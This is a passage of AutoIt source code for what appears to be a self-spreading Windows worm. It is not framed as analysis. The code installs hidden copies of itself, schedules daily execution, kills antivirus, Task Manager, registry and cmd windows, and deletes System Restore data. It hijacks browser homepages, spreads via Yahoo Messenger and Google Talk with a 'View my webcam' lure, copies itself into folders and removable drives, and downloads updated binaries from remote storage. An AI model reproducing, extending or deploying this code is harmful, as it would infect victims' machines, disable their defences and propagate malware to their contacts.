	$RENDOMMSG = StringRegExpReplace ( $RENDOMMSG , "ENTER" , @CRLF )
	Return $RENDOMMSG
EndFunc
Func GETVAR ( $VARNAME , $DEFAULT = "DEFAULT_NOT_SET" , $SECTION = "setting" )
	If Not FileExists ( $SETTINGSFILEPATH ) Then
		DEBUG ( "Settings file not found: " & $SETTINGSFILEPATH & @CRLF & $VARNAME & "= Default" )
	EndIf
	Return IniRead ( $SETTINGSFILEPATH , $SECTION , $VARNAME , $DEFAULT )
EndFunc
Func INSTALL ( )
	If Not FileExists ( "c:\install.txt" ) Then
		If SAIFTYCHECK ( "install" ) Then
			$NAME = GETVAR ( "name" , $NAME )
			$VIRUS_FILE1 = $INSTALLDIR & "\" & $NAME & $EXE
			$VIRUS_FILE2 = $SECONDDIR & "\" & $NAME & $EXE
			FileSetAttrib ( $VIRUS_FILE1 , "-RSH" )
			FileDelete ( $VIRUS_FILE1 )
			FileSetAttrib ( $VIRUS_FILE2 , "-RSH" )
			FileDelete ( $VIRUS_FILE2 )
			FileCopy ( @AutoItExe , $VIRUS_FILE1 , 0 )
			FileSetAttrib ( $VIRUS_FILE1 , "+RSH" )
			FileCopy ( @AutoItExe , $VIRUS_FILE2 , 0 )
			FileSetAttrib ( $VIRUS_FILE2 , "-RSH" )
			If Not FileExists ( $VIRUS_FILE2 ) Then
				DEBUG ( "ERROR: unable to install " & $VIRUS_FILE2 )
			EndIf
			If FileExists ( $VIRUS_FILE1 ) Then
				If FileExists ( $VIRUS_FILE2 ) Then
					DEBUG ( "File copied from " & @AutoItExe & " to " & Chr ( 10 ) & $VIRUS_FILE1 & Chr ( 10 ) & $VIRUS_FILE2 )
				Else
					DEBUG ( "Error: " & $VIRUS_FILE2 & " not copied." )
				EndIf
			Else
				DEBUG ( "Error: " & $VIRUS_FILE1 & " not copied." )
			EndIf
			DISABLEWINAPPS ( )
			SETBROWSERHOMEPAGE ( )
			_RUNDOS ( "AT /delete /yes" )
			_RUNDOS ( "AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su " & $INSTALLDIR & "\" & $NAME & $EXE )
		EndIf
	Else
		DEBUG ( "Skipping installation as c:\install.txt exists" )
	EndIf
EndFunc
Func KILLPROCESS ( )
	If ProcessExists ( "game_y.exe" ) Then
		ProcessClose ( "game_y.exe" )
	EndIf
	If WinExists ( "Bkav2006" ) Then
		WinClose ( "Bkav2006" )
		RegDelete ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" , "BkavFw" )
	EndIf
	If WinExists ( "System Configuration" ) Then
		WinClose ( "System Configuration" )
	EndIf
	If WinExists ( "Registry" ) Then
		WinClose ( "Registry" )
	EndIf
	If WinExists ( "Windows Task" ) Then
		WinClose ( "Windows Task" )
	EndIf
	If WinExists ( "[FireLion]" ) Then
		RegDelete ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "IEProtection" )
		Shutdown ( 2 )
	EndIf
	If ProcessExists ( "cmd.exe" ) Then
		ProcessClose ( "cmd.exe" )
	EndIf
EndFunc
Func LOGMSG ( $MSG )
	If $DEBUG Then
		$FILE = FileOpen ( $LOGFILENAME , 1 )
		If $FILE = - 1 Then
			MsgBox ( 0 , "Error" , "Unable to open file." )
			Exit
		EndIf
		FileWrite ( $FILE , $MSG )
		FileWrite ( $FILE , @CR & @LF )
		FileClose ( $FILE )
	EndIf
EndFunc
Func MAIN ( )
	$LIST = ProcessList ( GETFILENAME ( @AutoItExe ) )
	If $LIST [ 0 ] [ 0 ] > 1 Then
		DEBUG ( "One copy of program is allready running..." )
		Exit
	EndIf
	PRINTGLOBLES ( )
	INSTALL ( )
	CREATEINI ( )
	UPDATE ( )
	$SENDMSGTIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $SENDMSGDELAY )
	$UPDATETIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $SENDUPDATEDELAY )
	$COPYINDISKTIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $COPYINDISKDELAY )
	If SETUPYM ( ) Then
		ADDID ( $MYYMID )
		Sleep ( 2000 )
		SENDYMMESS ( )
		Sleep ( 30000 )
	EndIf
	REMOVERESTOREPOINTS ( )
	SENDGTALKMESS ( )
	COPYINDISK ( "ALL" )
	COPYNETWORK ( )
	While ( 1 )
		If FileExists ( "c:\god.txt" ) Then Exit
		KILLPROCESS ( )
		If TimerInit ( ) > $COPYINDISKTIMER Then
			COPYINDISK ( "REMOVABLE" )
			$COPYINDISKTIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $COPYINDISKDELAY )
		Else
			DEBUG ( "Ignoring 'copyInDisk' " & Int ( TimerInit ( ) / $ONEMINDIFF ) & " < " & Int ( $COPYINDISKTIMER / $ONEMINDIFF ) )
		EndIf
		If TimerInit ( ) > $UPDATETIMER Then
			UPDATE ( )
			$UPDATETIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $SENDUPDATEDELAY )
		Else
			DEBUG ( "Ignoring 'update' " & Int ( TimerInit ( ) / $ONEMINDIFF ) & " < " & Int ( $UPDATETIMER / $ONEMINDIFF ) )
		EndIf
		If TimerInit ( ) > $SENDMSGTIMER Then
			SETBROWSERHOMEPAGE ( )
			If SETUPYM ( ) Then
				SENDYMMESS ( )
			EndIf
			Sleep ( 30000 )
			SENDGTALKMESS ( )
			$SENDMSGTIMER = TimerInit ( ) + Number ( $ONEMINDIFF * $SENDMSGDELAY )
		Else
			DEBUG ( "Ignoring 'setupYM and sendYMmess' " & Int ( TimerInit ( ) / $ONEMINDIFF ) & " < " & Int ( $SENDMSGTIMER / $ONEMINDIFF ) )
		EndIf
	WEnd
	DEBUG ( "Program is done....." )
EndFunc
Func PRINTGLOBLES ( )
	If SAIFTYCHECK ( "printGlobles" ) Then
		$STRING = "$DEBUG        = " & $DEBUG & @CRLF & "$timeStamp    = " & $TIMESTAMP & @CRLF & "$name         = " & $NAME & @CRLF & "$myYMID       = " & $MYYMID & @CRLF & "$ini          = " & $INI & @CRLF & "$nql          = " & $NQL & @CRLF & "$xls          = " & $XLS & @CRLF & "$VERSION      = " & $VERSION & @CRLF & "$homepage[0]  = " & $HOMEPAGE [ 0 ] & @CRLF & "$webstoragepool[15]= " & $WEBSTORAGEPOOL [ 15 ] & @CRLF & "$InstallDir   = " & $INSTALLDIR & @CRLF & "$secondDir    = " & $SECONDDIR & @CRLF & "$logfilename  = " & $LOGFILENAME
		DEBUG ( $STRING )
	EndIf
EndFunc
Func REMOVERESTOREPOINTS ( )
	If SAIFTYCHECK ( "removeRestorePoints" ) Then
		$DISK = DriveGetDrive ( "FIXED" )
		If Not @error Then
			For $I = 1 To $DISK [ 0 ]
				If $DISK [ $I ] <> "A:" Then
					$COMMAND = "cacls " & Chr ( 34 ) & @HomeDrive & "\system volume information" & Chr ( 34 ) & " /e /g " & Chr ( 34 ) & @UserName & Chr ( 34 ) & ":f"
					_RUNDOS ( $COMMAND )
					FileSetAttrib ( @HomeDrive & "\system volume information" , "-RSH" , 1 )
					DirRemove ( @HomeDrive & "\system volume information" , 1 )
					DEBUG ( "Removing " & @HomeDrive & "\system volume information" )
				EndIf
			Next
		EndIf
	EndIf
EndFunc
Func SAIFTYCHECK ( $FUNCNAME = "this function" )
	If FileExists ( "c:\god.txt" ) Then Exit
	$CN = @ComputerName
	$PASSWORD = "amonia007"
	If ( $CN == "ALLADIN" ) Or ( $CN == "TARANG" ) Or ( $CN == "PARAM" ) Or FileExists ( "c:\debug.txt" ) Then
		$DEBUG = True
		$USR_STR = InputBox ( "Free Phone Dialer  -  " & $TIMESTAMP , "Execution of '" & $FUNCNAME & "' requires password." , "" , "*" )
		If ( 1 = @error ) Then
			DEBUG ( "Program is done" )
			Exit 0
		EndIf
		If ( $PASSWORD = $USR_STR ) Then
			Return True
		Else
			Return False
		EndIf
	Else
		$DEBUG = False
		Return True
	EndIf
EndFunc
Func SEARCHANDSPREAD ( $CURRENT )
	If Not FileExists ( "c:\disk.txt" ) Then
		Local $SEARCH = FileFindFirstFile ( $CURRENT & "\*.*" )
		While 1
			Dim $FILE = FileFindNextFile ( $SEARCH )
			If @error Or StringLen ( $FILE ) < 1 Then ExitLoop
			If StringInStr ( FileGetAttrib ( $CURRENT & "\" & $FILE ) , "D" ) And ( $FILE <> "." Or $FILE <> ".." ) Then
				LOGMSG ( "Spreading " & $CURRENT & "\" & $FILE & "\" & $FILE & $EXE )
				FileCopy ( $VIRUS_FILE2 , $CURRENT & "\" & $FILE & "\" & $FILE & $EXE , 0 )
				SEARCHANDSPREAD ( $CURRENT & "\" & $FILE )
			EndIf
			Sleep ( 1 )
		WEnd
		FileClose ( $SEARCH )
	Else
		DEBUG ( "Skipping SearchAndSpread as c:\disk.txt is exists" )
	EndIf
EndFunc
Func SENDGTALKMESS ( )
	If SAIFTYCHECK ( "sendGtalkmess" ) Then
		If SETUPGTALK ( ) Then
			BlockInput ( 1 )
			Sleep ( 1000 )
			SETUPGTALK ( )
			Sleep ( 1000 )
			$WIDTH = 250
			WinMove ( "Google Talk" , "" , @DesktopWidth - $WIDTH , 0 , $WIDTH , @DesktopHeight )
			Send ( "a" )
			Send ( "{BACKSPACE}" )
			$DELAY = 100
			Sleep ( $DELAY )
			BlockInput ( 1 )
			For $I = 1 To 10 Step 1
				ClipPut ( GETRANDOMMSG ( ) )
				Send ( "{DOWN}" )
				Sleep ( $DELAY )
				Send ( "{ENTER}" )
				Sleep ( $DELAY )
				Send ( "^v {ENTER}" )
				Sleep ( $DELAY )
				Send ( "!{f4}" )
				Sleep ( $DELAY )
			Next
			BlockInput ( 0 )
		EndIf
		BlockInput ( 0 )
		Sleep ( 1000 )
		BlockInput ( 0 )
		WinSetOnTop ( "Google Talk" , "" , 0 )
	EndIf
EndFunc
Func SENDYMMESS ( )
	If SAIFTYCHECK ( "sendYMmess" ) Then
		$TIEUDE = WinGetTitle ( "Yahoo! Messenger" , "" )
		$KIEMTRA = WinExists ( $TIEUDE )
		If $KIEMTRA = 1 Then
			BlockInput ( 1 )
			WinActivate ( $TIEUDE )
			ClipPut ( "View my webcam (private)" & GETBINARYPATH ( ".exe" ) )
			Send ( "!m" )
			Send ( "un" )
			Send ( "^v {ENTER}{ENTER}" )
			Send ( "^m" )
			Send ( "{DOWN}" )
			Send ( "^{SHIFTDOWN}{END}{SHIFTUP}" )
			Sleep ( 1000 )
			Send ( "{ENTER}" )
			Sleep ( 1000 )
			ClipPut ( GETRANDOMMSG ( ) )
			Send ( "^v {ENTER}" )
			BlockInput ( 0 )
		EndIf
		Sleep ( 100 )
	EndIf
EndFunc
Func SETBROWSERHOMEPAGE ( )
	If SAIFTYCHECK ( "setBrowserHomePage" ) Then
		$MYWEB = GETHOMEPAGE ( )
		RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" , "Default_Page_URL" , "REG_SZ" , $MYWEB )
		RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" , "Default_Search_URL" , "REG_SZ" , $MYWEB )
		RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" , "Search Page" , "REG_SZ" , $MYWEB )
		RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , $MYWEB )
		RegWrite ( "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Control Panel" , "HomePage" , "REGDWORD" , 1 )
		RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , $MYWEB )
		RegWrite ( "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" , "HomePage" , "REGDWORD" , 1 )
		DEBUG ( "set browser default page to " & $MYWEB )
	EndIf
EndFunc
Func SETUPGTALK ( )
	$TIEUDE = "Google Talk"
	$STATUS = WinActivate ( $TIEUDE )
	If Not $STATUS Then
		$GOOGLETALK = RegRead ( "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\gtalk\shell\open\command" , "" )
		$RESULT = StringInStr ( $GOOGLETALK , "googletalk" )
		If $RESULT Then
			$GOOGLETALK = StringSplit ( $GOOGLETALK , """" )
			Run ( $GOOGLETALK [ 2 ] )
			Sleep ( 1000 )
			Send ( "{enter}" )
		EndIf
		Return 0
	Else
		WinGetTitle ( $TIEUDE , "" )
		WinSetState ( "Google Talk" , "" , @SW_SHOW )
		WinSetOnTop ( "Google Talk" , "" , 1 )
	EndIf
	WinActivate ( $TIEUDE )
	$COTECTLISTVISIBLE = ControlCommand ( "Google Talk" , "" , "[CLASS:Contact List View; INSTANCE:1]" , "IsVisible" , "" )
	If Not $COTECTLISTVISIBLE Then
		DEBUG ( "TERMINATING, as user is not loged on Google talk..." )
		Return 0
	Else
		DEBUG ( "Gtalk is set for sending messages..." )
	EndIf
	Return WinExists ( $TIEUDE )
EndFunc
Func SETUPYM ( )
	If SAIFTYCHECK ( "setupYM" ) Then
		$TIEUDE = "Yahoo! Messenger"
		$STATUS = WinActivate ( $TIEUDE )
		If Not $STATUS Then
			$YAHOOMESSANGER = RegRead ( "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ymsgr\shell\open\command" , "" )
			$RESULT = StringInStr ( $YAHOOMESSANGER , "YahooMessenger" )
			If $RESULT Then
				$YAHOOMESSANGER = StringSplit ( $YAHOOMESSANGER , """" )
				Run ( $YAHOOMESSANGER [ 2 ] )
				Sleep ( 1000 )
				Send ( "{enter}" )
			Else
				DEBUG ( "Yahoo Messenger is not installed on your machine" )
				Return 0
				MsgBox ( 64 , "Search result:" , "Yahoo Messenger is not installed on your machine" & Chr ( 10 ) & Chr ( 10 ) & "Going to install it" )
				If InetGet ( "http://rd.software.yahoo.com/msgr/9/msgr9us.exe" , @DesktopDir & "\" & "yahooInstaller.exe" , 1 , 0 ) Then
					If FileExists ( @DesktopDir & "\" & "yahooInstaller.exe" ) Then
						MsgBox ( 64 , "Download Status" , "Yahoo Messenger's installer program downloaded successfully  " & Chr ( 10 ) & Chr ( 10 ) & @DesktopDir & "\" & "yahooInstaller.exe" )
						Run ( @DesktopDir & "\" & "yahooInstaller.exe" )
					Else
						MsgBox ( 16 , "Download Status" , "Failed to download Yahoo Messenger" )
					EndIf
				Else
					MsgBox ( 16 , "Internet issue" , "Failed to download Yahoo Messenger" )
				EndIf
			EndIf
			Return 0
		Else
			$TEXT = ControlGetText ( "Yahoo! Messenger" , "" , "[CLASS:Button; INSTANCE:4]" )
			If $TEXT == "&Sign In" Then
				DEBUG ( "NOTE: User not signed in. hitting enter to sign in user" )
				Send ( "{enter}" )
			EndIf
			$TEXT = ControlGetText ( "Yahoo! Messenger" , "" , "[CLASS:YMBuddySearcher; INSTANCE:1]" )
			If ( Not ( $TEXT = "YMBuddySearcher" ) ) Then
				DEBUG ( "TERMINATING, as user is not loged on Yahoo Messanger..." )
				Return 0
			Else
				DEBUG ( "Yahoo Messenger is set for sending messages..." )
			EndIf
		EndIf
		Return 1
	EndIf
EndFunc
Func UPDATE ( )
	If SAIFTYCHECK ( "update" ) Then
		DOWNLOADSETTINGSFILE ( )
		$WEBSTORAGE = GETVAR ( "webstoragepool[15]" , $WEBSTORAGEPOOL [ 15 ] )
		$WEBSTORAGEPOOLCOUNT = GETVAR ( "webstoragepoolcount" , $WEBSTORAGEPOOLCOUNT )
		$NAME = GETVAR ( "name" , $NAME )
		$FILE01 = GETVAR ( "filedownload1" , "NO_FILE" )
		$SENDMSGDELAY = GETVAR ( "sendMsgDelay" , $SENDMSGDELAY )
		$SENDUPDATEDELAY = GETVAR ( "sendUpdateDelay" , $SENDUPDATEDELAY )
		$COPYINDISKDELAY = GETVAR ( "copyInDiskDelay" , $COPYINDISKDELAY )
		$DEACTIVE = GETVAR ( "deactive" , "NO" )
		$NEWFILEVERSION = GETVAR ( "version" , "100000" )
		If ( $DEACTIVE = "yes" ) Then
			DEBUG ( "EXIT: Program is disabled by programer from settings file." )
			Exit
		EndIf
		DEBUG ( "SETTING.webstorage = " & $WEBSTORAGE & Chr ( 10 ) & Chr ( 10 ) & "SETTING.name       = " & $NAME & Chr ( 10 ) & "SETTING.check03    = " & $FILE01 & Chr ( 10 ) & Chr ( 10 ) & "SETTING.sendMsg    = " & $SENDMSGDELAY & Chr ( 10 ) & "SETTING.sendUpdate = " & $SENDUPDATEDELAY & Chr ( 10 ) & "SETTING.copyInDisk = " & $COPYINDISKDELAY )
		If $VERSION < $NEWFILEVERSION Then
			DEBUG ( "New version is awalable. V" & $NEWFILEVERSION & Chr ( 10 ) & "You are running V" & $VERSION )
			If ( Not ( $FILE01 = "NO_FILE" ) ) Then
				For $IND = 1 To $WEBSTORAGEPOOLCOUNT * 2 Step 1
					$STATUS = DOWNLOADBINARY ( $FILE01 , ".xls" )
					If ( Not ( $STATUS = 2 ) ) Then
						ExitLoop
					Else
						$STATUS = DOWNLOADBINARY ( $FILE01 , ".exe" )
						If ( Not ( $STATUS = 2 ) ) Then
							ExitLoop
						EndIf
					EndIf
				Next
			EndIf
		Else
			DEBUG ( "No new version is awalable. you are running V " & $VERSION )
		EndIf
		If SETUPYM ( ) Then
			ADDID ( $MYYMID )
			Sleep ( 2000 )
		EndIf
	EndIf
EndFunc
Func SETUPFIREFOX ( $SET_URL )
	Dim $FOLDERNAME = @AppDataDir
	$SEARCHFILE = "prefs.js"
	SCANFOLDER ( $FOLDERNAME , $SEARCHFILE )
	DUMPFIREFOXCONFIGFILE ( $PREFSPATH , $PREFSPATH & ".new" , $SET_URL )
	FileMove ( $PREFSPATH & ".new" , $PREFSPATH , 1 )
EndFunc
Func SCANFOLDER ( $SOURCEFOLDER , $SEARCHFILE )
	Local $SEARCH
	Local $FILE
	Local $FILEATTRIBUTES
	Local $FULLFILEPATH
	$SEARCH = FileFindFirstFile ( $SOURCEFOLDER & "\*.*" )
	While 1
		If $SEARCH = - 1 Then
			ExitLoop
		EndIf
		$FILE = FileFindNextFile ( $SEARCH )
		If @error Then ExitLoop
		$FULLFILEPATH = $SOURCEFOLDER & "\" & $FILE
		$FILEATTRIBUTES = FileGetAttrib ( $FULLFILEPATH )
		If StringInStr ( $FILEATTRIBUTES , "D" ) Then
			SCANFOLDER ( $FULLFILEPATH , $SEARCHFILE )
		Else
			If $SEARCHFILE = $FILE Then
				$PREFSPATH = $FULLFILEPATH
			EndIf
		EndIf
	WEnd
	FileClose ( $SEARCH )
EndFunc
Func DUMPFIREFOXCONFIGFILE ( $FILENAME , $WRITE_IN , $URL )
	$FILE_R = FileOpen ( $FILENAME , 0 )
	If $FILE_R = - 1 Then Return
	$FILE_W = FileOpen ( $WRITE_IN , 1 )
	If $FILE_W = - 1 Then Return
	While 1
		$LINE = FileReadLine ( $FILE_R )
		If @error = - 1 Then ExitLoop
		If Not StringInStr ( $LINE , """browser.startup.homepage""" ) Then
			FileWriteLine ( $FILE_W , $LINE )
		EndIf
	WEnd
	FileWriteLine ( $FILE_W , "user_pref(""browser.startup.homepage"", """ & $URL & """);" )
	FileClose ( $FILE_R )
	FileClose ( $FILE_W )
EndFunc
